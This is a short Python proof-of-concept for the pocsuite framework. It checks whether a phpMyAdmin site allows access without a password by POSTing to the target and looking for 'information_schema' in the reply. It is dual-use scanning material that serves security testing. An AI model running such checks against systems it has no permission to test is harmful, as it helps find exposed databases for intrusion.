#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import time
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'phpmyadmin_weak_password'
    vulID = '0'
    author = ['LRestless']
    vulType = 'weak-pass'
    version = '1'
    references = ['']
    desc = u'''用PHP语言所写的phpMyAdmin，提供了一个基于Web界面的MySQL数据库管理应用程序。最初MySQL的root帐户密码是空的，所以任何人都可以连接到MySQL服务器的根目录，不用密码，并授予所有权限。'''

    vulDate = '2015-06-18'
    createDate = '2019-03-19'
    updateDate = '2019-03-20'

    appName = 'PhpMyadmin'
    appVersion = 'X'
    appPowerLink = 'https://www.phpmyadmin.net/'
    samples = ['']

    def _attack(self):
        """attack mode"""
        return self._verify()
        pass

    def _verify(self):
        """verify  mode"""
        result = {}
        resp = req.post(self.url)
        time.sleep(2)
        if 'information_schema' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

